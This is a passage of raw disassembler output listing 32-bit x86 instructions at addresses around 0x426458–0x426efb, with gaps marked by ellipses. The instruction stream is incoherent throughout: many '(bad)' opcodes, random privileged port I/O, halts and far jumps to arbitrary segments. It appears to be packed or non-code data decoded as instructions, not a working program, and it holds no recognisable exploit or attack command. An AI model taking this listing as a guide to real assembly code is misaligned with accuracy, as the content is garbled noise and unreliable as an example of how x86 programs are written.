  426458:	sub    eax,0xbe93c919
  42645d:	popf   
  42645e:	fld    QWORD PTR [ebx+edx*8]
  426461:	mov    bl,0x7a
  426463:	or     ebx,DWORD PTR [esi-0x28aaee4]
  426469:	or     bh,dh
  42646b:	or     bl,BYTE PTR [ebx]
  42646d:	loope  0x42649f
  42646f:	mov    bl,0x8
  426471:	or     eax,0xb153ac39
  426476:	push   0x73
  426478:	or     DWORD PTR [eax+0x70374304],esi
  42647e:	adc    BYTE PTR [ebp+0x5a1e374e],0x4e
  426485:	aad    0x2
  426487:	fcomp  DWORD PTR [eax]
  426489:	inc    ecx
  42648b:	cwde   
  42648c:	stos   BYTE PTR es:[edi],al
  42648d:	xor    al,0x94
  42648f:	inc    edx
  426490:	daa    
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   ebx,eax
  426501:	imul   esi,DWORD PTR [edx-0x6a],0x199b0
  426508:	add    eax,0xc0000001
  42650d:	mov    esp,0xf67bc4a2
  426512:	push   edx
  426513:	add    eax,0x6edde6fb
  426518:	call   FWORD PTR [esi]
  42651a:	les    esp,FWORD PTR ds:0x548ac5c2
  426520:	ret    
  426521:	(bad)  
  426523:	fdivr  DWORD PTR [eax-0x76]
  426526:	sbb    BYTE PTR [esi-0x5ea6aabc],ch
  42652c:	dec    ebp
  42652d:	xor    al,0xa4
  42652f:	jns    0x42658e
  426531:	mov    ebx,0x3f5bb927
  426536:	inc    eax
  426537:	jge    0x4264f7
  426539:	repnz pushf 
  42653b:	xor    ecx,ebp
  42653d:	adc    cl,BYTE PTR [ebx+esi*8]
  426540:	sbb    eax,DWORD PTR ds:0x953474a3
  426546:	xor    al,0x43
  426548:	push   DWORD PTR [edi-0x61]
  42654b:	cmp    al,0xa4
  42654d:	mov    edi,DWORD PTR [eax]
  42654f:	xor    DWORD PTR [ebp+0x1b],eax
  426552:	push   ss
  426553:	scas   eax,DWORD PTR es:[edi]
  426554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426555:	dec    ebp
  426556:	jae    0x426546
  426558:	cld    
  426559:	in     al,dx
  42655a:	cwde   
  42655b:	xchg   DWORD PTR ds:0x51e77cbd,esp
  426561:	fwait
  426562:	in     eax,dx
  426563:	push   0xe314001e
  426568:	jns    0x42659d
  42656a:	xchg   esi,eax
  42656b:	stos   DWORD PTR es:[edi],eax
  42656c:	jmp    0x3a63:0x28866443
  426573:	jb     0x4265dc
  426575:	add    eax,0xa4583116
  42657a:	retf   0x7220
  42657d:	push   0x455380ed
  426582:	les    eax,FWORD PTR [edi+0x65d70002]
  426588:	pop    esp
  426589:	pop    edi
  42658a:	sbb    ebx,DWORD PTR [eax+0x39]
  42658d:	mov    ds:0x192f15b5,al
  426592:	shl    DWORD PTR [esi+0x36],0xa
  426596:	icebp  
  426597:	cmpps  xmm2,XMMWORD PTR [ebx+0x4294379],0x38
  42659f:	jnp    0x426578
  4265a1:	leave  
  4265a2:	pusha  
  4265a3:	xor    DWORD PTR [esp+eax*8-0x64c47628],ecx
  4265aa:	cmp    eax,0xf7ac103e
  4265af:	xlat   BYTE PTR ds:[ebx]
  4265b0:	lods   eax,DWORD PTR ds:[esi]
  4265b1:	(bad)  
  4265b2:	sqrtps xmm4,XMMWORD PTR fs:[edx]
  4265b6:	sub    ebx,ecx
  4265b8:	push   ss
  4265b9:	xchg   edi,eax
  4265ba:	into   
  4265bb:	test   al,0x37
  4265bd:	std    
  4265be:	mov    bh,0xf3
  4265c0:	xchg   ebp,eax
  4265c1:	addr16 aad 0x5d
  4265c4:	mov    bl,0x45
  4265c6:	mov    ah,0xc0
  4265c8:	ror    DWORD PTR [eax+0x68163075],cl
  4265ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	push   eax
  4265d0:	mov    al,0x29
  4265d2:	push   ds
  4265d3:	adc    BYTE PTR ds:0xbb0d66ec,bh
  4265d9:	or     eax,0xc477206f
  4265de:	adc    esp,edx
  4265e0:	out    0xbc,al
  4265e2:	mov    esi,DWORD PTR [ebx]
  4265e4:	push   es
  4265e5:	dec    esi
  4265e6:	arpl   bp,si
  4265e8:	or     eax,0xf65a04b3
  4265ed:	and    eax,0xc6588f8b
  4265f2:	hlt    
  4265f3:	inc    edx
  4265f4:	lock pop edi
  4265f6:	xchg   esi,eax
  4265f7:	mov    BYTE PTR [edx+0x72],ah
  4265fa:	adc    cl,dl
  4265fc:	in     eax,dx
  4265fd:	xlat   BYTE PTR ds:[ebx]
  4265fe:	push   esp
  4265ff:	fwait
  426600:	dec    edi
  426601:	mov    bh,0x42
  426603:	fadd   QWORD PTR [edi]
  426605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426606:	sbb    dl,BYTE PTR [ecx]
  426608:	xchg   ebx,eax
  426609:	xchg   ebp,eax
  42660a:	paddsb mm2,QWORD PTR [ebp+ecx*4+0x163e86]
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x3fd96da4]
  426682:	pop    eax
  426683:	out    0xb5,eax
  426685:	call   0x0:0x1050001
  42668c:	and    esi,DWORD PTR [ebx-0x66]
  42668f:	call   0x1b95:0x71e8fba4
  426696:	adc    bl,BYTE PTR [eax-0x6722dd88]
  42669c:	(bad)  
  42669d:	mov    ds:0x42c0b289,eax
  4266a2:	ja     0x4266f6
  4266a4:	adc    esp,0xcac7a7f9
  4266aa:	das    
  4266ab:	jns    0x4266fb
  4266ad:	pop    ebp
  4266ae:	add    al,0x32
  4266b0:	sub    BYTE PTR [esi+esi*8+0x2bcb743a],dh
  4266b7:	mov    ?,WORD PTR [edi+0x76156fab]
  4266bd:	sbb    bh,BYTE PTR [ecx]
  4266bf:	(bad)  
  4266c0:	in     al,dx
  4266c1:	pusha  
  4266c2:	or     edi,DWORD PTR [ebx-0x44]
  4266c5:	mov    edx,0xb2287957
  4266ca:	out    0x22,al
  4266cc:	mov    ?,WORD PTR [esi]
  4266ce:	pop    edi
  4266cf:	add    BYTE PTR [edi],0x1b
  4266d2:	out    0xba,al
  4266d4:	inc    ecx
  4266d5:	(bad)  
  4266d6:	(bad)  [eax+edi*4]
  4266d9:	jno    0x4266bc
  4266db:	jmp    0x63cc:0x2fb7b439
  4266e2:	push   ecx
  4266e3:	or     BYTE PTR [ecx],bh
  4266e5:	fwait
  4266e6:	cmp    al,0x43
  4266e8:	jno    0x4266b5
  4266ea:	les    edi,FWORD PTR [ecx]
  4266ec:	mov    ds:0x2b4f075,eax
  4266f1:	jne    0x426743
  4266f3:	sar    BYTE PTR [esi],1
  4266f5:	cs xchg esp,eax
  4266f7:	in     eax,dx
  4266f8:	xchg   BYTE PTR [ebp+edi*8-0x5a],bl
  4266fc:	dec    edi
  4266fd:	adc    bl,cl
  4266ff:	sub    edi,DWORD PTR [edx-0x781d8241]
  426705:	cld    
  426706:	jmp    0x4266be
  426708:	ret    
  426709:	jns    0x426761
  42670b:	xor    BYTE PTR [edx-0x6f5a89bf],dl
  426711:	iret   
  426712:	lds    ebp,FWORD PTR [edi]
  426714:	mov    DWORD PTR [esi+0x62b09695],ecx
  42671a:	dec    BYTE PTR [ebp-0x30]
  42671d:	rol    BYTE PTR [ebx],cl
  42671f:	into   
  426720:	sbb    esi,DWORD PTR [ebp-0x72ab6cfc]
  426726:	pop    edx
  426727:	lds    ecx,FWORD PTR [eax]
  426729:	data16 int 0x87
  42672c:	cwde   
  42672d:	lds    eax,FWORD PTR [esi-0x6a]
  426730:	sahf   
  426731:	add    ebp,DWORD PTR [eax-0xa71e8f3]
  426737:	call   0x3a30:0x44d625c5
  42673e:	aam    0x57
  426740:	sub    DWORD PTR [edx-0x71e20bf4],eax
  426746:	ja     0x426783
  426748:	lds    ebx,FWORD PTR [esi+0x1f]
  42674b:	push   ss
  42674c:	aas    
  42674d:	cmp    BYTE PTR [esi-0x7c00b62c],ch
  426753:	in     al,0xd5
  426755:	pop    ds
  426756:	rol    DWORD PTR [ebp-0x4f9c96c9],cl
  42675c:	pop    ss
  42675d:	into   
  42675e:	mov    ecx,0x4d3d0700
  426763:	aaa    
  426764:	(bad)  
  426765:	repnz mov al,0x29
  426768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426769:	dec    esp
  42676a:	ss pop ecx
  42676c:	sub    bl,cl
  42676e:	pushf  
  42676f:	test   BYTE PTR [ebp-0x4a],bh
  426772:	pusha  
  426773:	ss lock stos DWORD PTR es:[edi],eax
  426776:	inc    esp
  426777:	mov    ebp,0x4260f8da
  42677c:	in     eax,dx
  42677d:	popf   
  42677e:	add    BYTE PTR [ebp-0x1f4c2391],ah
  426784:	xlat   BYTE PTR ds:[ebx]
  426785:	mov    cl,0xea
  426787:	add    ecx,ebp
  426789:	scas   al,BYTE PTR es:[edi]
  42678a:	mov    ch,0x8f
  42678c:	icebp  
  42678d:	inc    edi
  42678e:	(bad)  
  42678f:	das    
  426790:	test   DWORD PTR [eax],0x0
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	sbb    bl,BYTE PTR [esi-0x6c]
  426803:	repnz mov edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    bl,bh
  42680d:	sub    ebx,DWORD PTR [ecx-0x3be00336]
  426813:	or     ah,BYTE PTR [ecx]
  426815:	cmp    ch,bh
  426817:	pushf  
  426818:	mov    ebp,0xa9ec3942
  42681d:	leave  
  42681e:	mov    esi,DWORD PTR [esp+ebp*4+0x3439e019]
  426825:	ins    BYTE PTR es:[edi],dx
  426826:	or     dh,al
  426828:	lds    ebp,FWORD PTR [edi-0xa]
  42682b:	test   DWORD PTR [edi],ebx
  42682d:	or     eax,0x87447d3b
  426832:	adc    edi,DWORD PTR [ecx-0x6b]
  426835:	lods   al,BYTE PTR ds:[esi]
  426836:	shr    bh,0x2e
  426839:	hlt    
  42683a:	(bad)  
  42683b:	loop   0x42685a
  42683d:	fcmovb st,st(0)
  42683f:	nop
  426840:	mov    ebx,0x42639de2
  426845:	mov    eax,0x8e29c9a8
  42684a:	pop    edi
  42684b:	add    BYTE PTR [eax+0x64d9e5e],bl
  426851:	mov    edx,0xd4d7208a
  426856:	ret    
  426857:	aam    0xba
  426859:	or     eax,0x745a3399
  42685e:	and    DWORD PTR ds:0x1ffd270d,ecx
  426864:	(bad)  
  426865:	pop    ds
  426866:	add    BYTE PTR [esi],ah
  426868:	addr16 add ebp,0x98e82ec7
  42686f:	jmp    0x19f5:0x20391fe8
  426876:	stc    
  426877:	push   eax
  426878:	iret   
  426879:	inc    esp
  42687a:	jl     0x42684d
  42687c:	xchg   ebp,eax
  42687d:	push   ebx
  42687e:	cli    
  42687f:	pop    esp
  426880:	(bad)  
  426881:	sub    ebp,DWORD PTR [eax]
  426883:	popa   
  426884:	fwait
  426885:	pushf  
  426886:	aas    
  426887:	add    ah,BYTE PTR [eax+ebp*1+0x4f8e50d2]
  42688e:	push   ecx
  42688f:	call   0x8489bd38
  426894:	lods   al,BYTE PTR ds:[esi]
  426895:	push   es
  426896:	shl    BYTE PTR [di],0x93
  42689a:	jnp    0x4268cc
  42689c:	outs   dx,DWORD PTR ds:[esi]
  42689d:	mov    eax,ds:0x520a6cdd
  4268a2:	add    bl,ch
  4268a4:	or     bh,BYTE PTR [ecx]
  4268a6:	xchg   ecx,eax
  4268a7:	add    al,0x49
  4268a9:	adc    al,0x17
  4268ab:	(bad)  
  4268ac:	xchg   esp,eax
  4268ad:	push   ss
  4268ae:	iret   
  4268af:	dec    ecx
  4268b0:	mov    cl,0xd9
  4268b2:	jmp    0x94d0:0xa4048ed2
  4268b9:	repz or edx,DWORD PTR [ebx+0x43]
  4268bd:	inc    ecx
  4268be:	cmp    al,0x2f
  4268c0:	jg     0x42691b
  4268c2:	loopne 0x4268b5
  4268c4:	std    
  4268c5:	popa   
  4268c6:	inc    edi
  4268c7:	fistp  QWORD PTR [ebx]
  4268c9:	dec    edx
  4268ca:	dec    edi
  4268cb:	in     eax,dx
  4268cc:	fstp   TBYTE PTR [ecx-0x158442f4]
  4268d2:	jmp    0x7beb:0x4b8404dd
  4268d9:	mov    ch,0xa9
  4268db:	cmp    DWORD PTR [edi+0x4d],ebx
  4268de:	push   eax
  4268df:	push   edi
  4268e0:	xchg   esi,eax
  4268e1:	sahf   
  4268e2:	sbb    al,0x55
  4268e4:	arpl   WORD PTR [ebx-0x1f],dx
  4268e7:	xor    DWORD PTR [edi+0x1f],ebx
  4268ea:	or     DWORD PTR [ebx],0x5d
  4268ed:	inc    esp
  4268ee:	xchg   esi,eax
  4268ef:	arpl   WORD PTR [esi+0x58576f7b],cx
  4268f5:	sub    cl,BYTE PTR [esi]
  4268f7:	mov    bl,0x85
  4268f9:	sahf   
  4268fa:	enter  0x5ecd,0x23
  4268fe:	jnp    0x4268d2
  426900:	outs   dx,DWORD PTR ds:[esi]
  426901:	pop    eax
  426902:	dec    eax
  426903:	scas   al,BYTE PTR es:[edi]
  426904:	shl    BYTE PTR [edx+0x5c],1
  426907:	es int3 
  426909:	and    DWORD PTR [ecx-0x62f37bdb],esp
  42690f:	inc    eax
  426910:	push   ebx
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    esp,DWORD PTR [ecx-0x40f0e934]
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x6c000001
  42698d:	cs sub eax,0x45124357
  426993:	fmul   DWORD PTR [edi+0x55]
  426996:	xchg   esp,eax
  426997:	ret    
  426998:	jg     0x42695a
  42699a:	repz fild DWORD PTR ds:[ebp+eiz*8+0x597ae6eb]
  4269a3:	loop   0x4269b9
  4269a5:	push   0x651c5409
  4269aa:	je     0x4269da
  4269ac:	xchg   edx,eax
  4269ad:	bound  edx,QWORD PTR [edx+edx*1-0x73165a05]
  4269b4:	add    esp,ebp
  4269b6:	xchg   ecx,eax
  4269b7:	rol    bl,1
  4269b9:	xor    al,ah
  4269bb:	rol    BYTE PTR [eax+0x6d66321],0x26
  4269c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269c3:	xchg   edi,eax
  4269c4:	pop    es
  4269c5:	xor    al,0x9
  4269c7:	test   BYTE PTR [esi-0x24],dh
  4269ca:	fisubr DWORD PTR [ebx-0x479a9262]
  4269d0:	sub    dh,BYTE PTR [edi]
  4269d2:	push   0x184f4e31
  4269d7:	mov    al,ds:0xfe377d86
  4269dc:	repz or BYTE PTR [edi+0x38],0x59
  4269e1:	mov    ebp,0x7eb78378
  4269e6:	mov    edx,0x26ac983b
  4269eb:	add    eax,0xf10a782d
  4269f0:	push   0xbf63fbcf
  4269f5:	inc    edx
  4269f6:	add    edx,DWORD PTR [edi+ecx*2]
  4269f9:	out    0xc5,eax
  4269fb:	sub    eax,0xb5fb7a25
  426a00:	add    esi,DWORD PTR ds:0xae41d49a
  426a06:	(bad)  
  426a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a08:	sbb    BYTE PTR [ecx+ebp*4+0x4],dl
  426a0c:	sub    DWORD PTR [ecx-0x1c],esi
  426a0f:	(bad)  
  426a11:	jmp    0x4269df
  426a13:	sahf   
  426a14:	adc    DWORD PTR [ebp+0x46],ebp
  426a17:	pop    edx
  426a19:	jno    0x426a22
  426a1b:	jmp    0x4269fb
  426a1d:	mov    ds:0xe81a75e1,al
  426a22:	out    0xf6,eax
  426a24:	and    eax,0x6c9b176d
  426a29:	or     al,0x1b
  426a2b:	push   edx
  426a2c:	add    BYTE PTR [esp+esi*2-0xd],ah
  426a30:	stos   BYTE PTR es:[edi],al
  426a31:	jo     0x4269f4
  426a33:	cmp    DWORD PTR [ebp-0x68],0x76
  426a37:	mov    eax,ds:0x2279a9b0
  426a3c:	imul   edi,DWORD PTR [edi+0x75],0x5521809b
  426a43:	xor    BYTE PTR [edi-0x3d166a73],bl
  426a49:	inc    edi
  426a4a:	fwait
  426a4b:	out    0x6f,eax
  426a4d:	mov    bl,0x6d
  426a4f:	icebp  
  426a50:	repz les edi,FWORD PTR [ebx+eax*8]
  426a54:	mov    eax,ds:0x79dcb1f1
  426a59:	sub    DWORD PTR [eax-0x55],ebx
  426a5c:	mov    DWORD PTR [edx],0x7f15e4c1
  426a62:	dec    ebx
  426a63:	push   cs
  426a64:	sar    ebp,1
  426a66:	add    dl,al
  426a68:	cmp    ebx,DWORD PTR [eax-0x7abaef3a]
  426a6e:	push   ebx
  426a6f:	adc    edx,DWORD PTR [ebx]
  426a71:	add    eax,0x25bededc
  426a76:	mov    ecx,0x3056d4d5
  426a7b:	sti    
  426a7c:	jno    0x426a5c
  426a7e:	into   
  426a7f:	push   cs
  426a80:	clc    
  426a81:	ret    0x162d
  426a84:	mov    al,ds:0x9c5c1082
  426a89:	pop    ebx
  426a8a:	outs   dx,DWORD PTR ds:[esi]
  426a8b:	mov    cl,0x2b
  426a8d:	push   DWORD PTR [ebp+0x5]
  426a90:	scas   eax,DWORD PTR es:[edi]
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x8a
  426b01:	sbb    esp,esi
  426b03:	sbb    esp,eax
  426b05:	popf   
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    eax,0xff000001
  426b0d:	mov    esi,0xb5407ab4
  426b12:	add    BYTE PTR [edx],ch
  426b14:	fisttp WORD PTR gs:[edx+0x174739d9]
  426b1b:	jmp    0x426b71
  426b1d:	push   ss
  426b1e:	dec    esi
  426b1f:	pop    eax
  426b20:	ret    
  426b21:	add    eax,0xb0a739b1
  426b26:	push   esp
  426b27:	test   BYTE PTR [esi],dl
  426b29:	ins    DWORD PTR es:[edi],dx
  426b2a:	repz fild WORD PTR [edi]
  426b2d:	(bad)  
  426b2e:	mov    eax,0xd0aab747
  426b33:	iret   
  426b34:	sub    DWORD PTR [ebp+0x7c51720f],0xffffffd4
  426b3b:	leave  
  426b3c:	or     ch,dh
  426b3e:	push   eax
  426b3f:	mov    ds:0xeff4fd96,al
  426b44:	ror    BYTE PTR [ebx+0xf73631c],0x9f
  426b4b:	mov    DWORD PTR [ebp-0x7a03d74],0x574686ce
  426b55:	cdq    
  426b56:	test   DWORD PTR [eax-0x7b53bb8a],ebx
  426b5c:	pop    eax
  426b5d:	cs push esp
  426b5f:	push   es
  426b60:	aas    
  426b61:	fcomi  st,st(0)
  426b63:	bound  esi,QWORD PTR [eax+0x13]
  426b66:	ror    DWORD PTR [edi+esi*2-0x663ca368],1
  426b6d:	iret   
  426b6e:	call   0xc8314bac
  426b73:	xchg   edi,eax
  426b74:	fst    DWORD PTR [edx-0x19]
  426b77:	iret   
  426b78:	sbb    BYTE PTR [ecx+0x37],dl
  426b7b:	aam    0x9b
  426b7d:	(bad)  
  426b7e:	das    
  426b7f:	jno    0x426b16
  426b81:	outs   dx,BYTE PTR fs:[esi]
  426b83:	push   edi
  426b84:	push   ss
  426b85:	imul   edi,DWORD PTR [esi],0xffffffdb
  426b88:	mov    ds:0xa8f663d7,eax
  426b8d:	bound  edi,QWORD PTR ds:0x4e50a42f
  426b93:	adc    edx,DWORD PTR [ecx+0x3647f72a]
  426b99:	loop   0x426bdd
  426b9b:	fnstcw WORD PTR [ecx-0x64c0cded]
  426ba1:	mov    ss,eax
  426ba3:	push   ss
  426ba4:	(bad)  
  426ba5:	jle    0x426b28
  426ba7:	addr16 mov bh,0x94
  426baa:	dec    esi
  426bab:	fst    st(2)
  426bad:	cmp    dh,ch
  426baf:	cmp    DWORD PTR [edi-0x4955d21d],ebp
  426bb5:	pop    ds
  426bb6:	loopne 0x426c09
  426bb8:	(bad)  
  426bb9:	div    DWORD PTR [ebx]
  426bbb:	dec    edi
  426bbc:	pop    ds
  426bbd:	mov    eax,DWORD PTR [esi+0x3f]
  426bc0:	adc    DWORD PTR ds:0x1177fc56,ebx
  426bc6:	dec    edx
  426bc7:	jge    0x426b9d
  426bc9:	aas    
  426bca:	imul   ebp,DWORD PTR [ebx],0xfffffffb
  426bcd:	clc    
  426bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bcf:	push   esi
  426bd0:	cmp    DWORD PTR [eax+0x10],ebx
  426bd3:	call   0xa0ec55cd
  426bd8:	fnstcw WORD PTR [esi+ebx*2+0xb]
  426bdc:	sub    eax,0x7594e5f0
  426be1:	aaa    
  426be2:	int    0xa5
  426be4:	out    dx,al
  426be5:	jb     0x426c5b
  426be7:	outs   dx,BYTE PTR ds:[esi]
  426be8:	jmp    0x7921:0xcb3d4cf9
  426bef:	jg     0x426b75
  426bf1:	adc    al,BYTE PTR [edi-0x50dd2cca]
  426bf7:	xlat   BYTE PTR ds:[ebx]
  426bf8:	dec    ebp
  426bf9:	pushf  
  426bfa:	jb     0x426be7
  426bfc:	test   DWORD PTR [esp+eiz*2],esp
  426bff:	stc    
  426c00:	xchg   ebx,eax
  426c01:	cwde   
  426c02:	or     BYTE PTR [edi+0x95d48f],bh
  426c08:	jbe    0x426c0a
  426c0a:	daa    
  426c0b:	dec    edi
  426c0c:	jo     0x426bd7
  426c0e:	or     ecx,DWORD PTR [ebp+edx*8+0x0]
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x75e6b028
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x84000001
  426c8d:	mov    bh,0x80
  426c8f:	lahf   
  426c90:	lock (bad) [esi-0x21b327e1]
  426c97:	push   es
  426c98:	sub    al,BYTE PTR [ebx-0x10847c9a]
  426c9e:	pop    edx
  426c9f:	cdq    
  426ca0:	int    0x4
  426ca2:	sbb    dh,BYTE PTR [ebp+0x9]
  426ca5:	icebp  
  426ca6:	(bad)  
  426ca7:	(bad)  
  426ca8:	fisubr DWORD PTR [edx-0x77]
  426cab:	mov    edi,0x464248f6
  426cb0:	scas   al,BYTE PTR es:[edi]
  426cb1:	mov    ds:0x8cdb87db,al
  426cb6:	xor    al,0xcc
  426cb8:	push   ebx
  426cb9:	sub    DWORD PTR [ebx+edi*1-0x311c477],ecx
  426cc0:	dec    ebx
  426cc1:	repz and DWORD PTR [eax-0x206b9933],edi
  426cc8:	call   0xc3d77fda
  426ccd:	jp     0x426c59
  426ccf:	cdq    
  426cd0:	mov    ?,WORD PTR [edx+ecx*2-0x389189da]
  426cd7:	sub    eax,0xc72acd17
  426cdc:	in     eax,dx
  426cdd:	xlat   BYTE PTR ds:[ebx]
  426cde:	pop    ebp
  426cdf:	xor    bh,BYTE PTR [esi]
  426ce1:	jg     0x426cef
  426ce3:	adc    al,0xbe
  426ce5:	mov    al,0x17
  426ce7:	pop    edi
  426ce8:	or     eax,0x6f7517fd
  426ced:	mov    bl,0x87
  426cef:	imul   ecx,edx,0x3fca9233
  426cf5:	push   es
  426cf6:	in     eax,0x94
  426cf8:	sbb    ecx,DWORD PTR [edx-0x6e78849e]
  426cfe:	in     eax,0xc4
  426d00:	xchg   esi,eax
  426d01:	test   al,0x3c
  426d03:	adc    ch,BYTE PTR [ebx+eiz*2+0x21a12bdc]
  426d0a:	mov    ch,0xac
  426d0c:	xor    ch,bh
  426d0e:	out    0xa9,eax
  426d10:	(bad)  
  426d11:	jns    0x426d01
  426d13:	jl     0x426d27
  426d15:	push   0xcea7c632
  426d1a:	into   
  426d1b:	ds loope 0x426d8c
  426d1e:	mov    ebp,0x8c276f8a
  426d23:	mov    cl,0xb9
  426d25:	scas   al,BYTE PTR es:[edi]
  426d26:	adc    DWORD PTR [ebp-0x69],edx
  426d29:	or     eax,0x10546a51
  426d2e:	cmp    dl,BYTE PTR [esi-0x5218cf99]
  426d34:	mov    ecx,0x61a78f2f
  426d39:	or     ebx,esp
  426d3b:	ret    0x2c20
  426d3e:	mov    dl,0x20
  426d40:	jmp    0x426d9b
  426d42:	add    eax,0x523c280c
  426d47:	scas   eax,DWORD PTR es:[edi]
  426d48:	aad    0x21
  426d4a:	das    
  426d4b:	cmc    
  426d4c:	push   ebx
  426d4d:	push   edx
  426d4e:	hlt    
  426d4f:	arpl   si,di
  426d51:	cld    
  426d52:	(bad)  
  426d53:	std    
  426d54:	fwait
  426d55:	mov    bl,0x52
  426d57:	pop    edi
  426d58:	lahf   
  426d59:	aas    
  426d5a:	jl     0x426dd3
  426d5c:	test   BYTE PTR [edx+eax*1+0xa],ch
  426d60:	adc    eax,0x4b2e21ba
  426d65:	mov    edx,0x796b792b
  426d6a:	jo     0x426d05
  426d6c:	bnd jnp 0x426d95
  426d6f:	jg     0x426d80
  426d71:	les    esi,FWORD PTR [esi-0x4a8169d4]
  426d77:	pop    ebp
  426d78:	add    esp,ecx
  426d7a:	cmp    eax,esi
  426d7c:	rcr    esp,0xb7
  426d7f:	dec    esp
  426d80:	sbb    eax,0xc127eb0b
  426d85:	mov    edx,0x7c7500bc
  426d8a:	arpl   di,si
  426d8c:	and    esp,ecx
  426d8e:	and    dl,BYTE PTR [edi-0x57]
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xef0c:0xc7c2ecf9
  426e01:	das    
  426e02:	rcr    DWORD PTR [eax-0x32],cl
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x48000001
  426e0d:	fisttp WORD PTR [esi]
  426e0f:	mov    ah,0x7c
  426e11:	out    0xc8,al
  426e13:	into   
  426e14:	jne    0x426da3
  426e16:	retf   
  426e17:	je     0x426e32
  426e19:	lahf   
  426e1a:	aam    0xb6
  426e1c:	add    BYTE PTR [eax-0x7d8dc90d],dl
  426e22:	iret   
  426e23:	sbb    eax,eax
  426e25:	jle    0x426e0a
  426e27:	cmp    edx,ecx
  426e29:	or     esp,eax
  426e2b:	call   0x151b855f
  426e30:	pop    ebp
  426e31:	push   0xfffffff8
  426e33:	out    dx,al
  426e34:	pop    edx
  426e35:	sub    eax,edi
  426e37:	push   edx
  426e38:	clc    
  426e39:	add    eax,0x9abcc907
  426e3e:	push   ebx
  426e3f:	leave  
  426e40:	popa   
  426e41:	mov    cs,WORD PTR [edi]
  426e43:	cmp    DWORD PTR [ecx+0x15933733],edi
  426e49:	sub    eax,0x41b88cfa
  426e4e:	sbb    DWORD PTR [ecx+ebp*8],esi
  426e51:	ret    
  426e52:	push   esp
  426e53:	and    esi,ecx
  426e55:	test   DWORD PTR [edi],edx
  426e57:	mov    DWORD PTR [edx],0x59040104
  426e5d:	out    dx,al
  426e5e:	hlt    
  426e5f:	dec    eax
  426e60:	xchg   edx,eax
  426e61:	sub    bl,BYTE PTR [ecx]
  426e63:	repz add bl,BYTE PTR [edi+edx*1+0x3ad77602]
  426e6b:	add    BYTE PTR [ecx],bl
  426e6d:	leave  
  426e6e:	leave  
  426e6f:	out    dx,eax
  426e70:	and    al,0x41
  426e72:	mov    eax,ds:0xb3faa981
  426e77:	add    bl,BYTE PTR [edx+esi*1-0x1b455a62]
  426e7e:	stos   BYTE PTR es:[edi],al
  426e7f:	mov    edx,DWORD PTR [esi-0x7afc38dd]
  426e85:	or     bh,ah
  426e87:	in     eax,0x62
  426e89:	lods   eax,DWORD PTR ds:[esi]
  426e8a:	jo     0x426e80
  426e8c:	mov    ebx,0x7bacd0a2
  426e91:	push   esi
  426e92:	lock jnp 0x426e1b
  426e95:	push   edx
  426e96:	pop    esp
  426e97:	mov    ds:0xc885e117,eax
  426e9c:	int3   
  426e9d:	mov    eax,0x58b9e205
  426ea2:	packuswb mm3,mm2
  426ea5:	dec    ebp
  426ea6:	mov    ebx,0xc313e4d0
  426eab:	dec    edx
  426eac:	retf   0x6a7f
  426eaf:	mov    al,ds:0x5f640442
  426eb4:	in     al,dx
  426eb5:	out    dx,al
  426eb6:	dec    edx
  426eb7:	clc    
  426eb8:	clc    
  426eb9:	mov    BYTE PTR [ebp+0x1b21cceb],al
  426ebf:	arpl   WORD PTR ds:0xcc215fa,bx
  426ec5:	push   esi
  426ec6:	sbb    edx,edx
  426ec8:	xor    eax,0x1944ae52
  426ecd:	mov    ebp,0x570460b
  426ed2:	push   ss
  426ed3:	lock in eax,0x78
  426ed6:	xor    BYTE PTR [eax+0x4],ah
  426ed9:	xchg   BYTE PTR [eax-0x74],al
  426edc:	(bad)  
  426edd:	sar    cl,cl
  426edf:	add    esp,DWORD PTR [edx]
  426ee1:	mov    dl,0x6e
  426ee3:	adc    DWORD PTR [ecx-0x1b],edx
  426ee6:	and    cl,bl
  426ee8:	cmp    BYTE PTR [ebp+0x3c],al
  426eeb:	and    ah,ch
  426eed:	push   cs
  426eee:	mul    BYTE PTR [edi+0x50]
  426ef1:	or     DWORD PTR [ebp-0x6e788095],esi
  426ef7:	cmp    DWORD PTR [esi-0x10],esi
  426efa:	xchg   ebx,eax
  426efb:	add    BYTE PTR [ecx],al
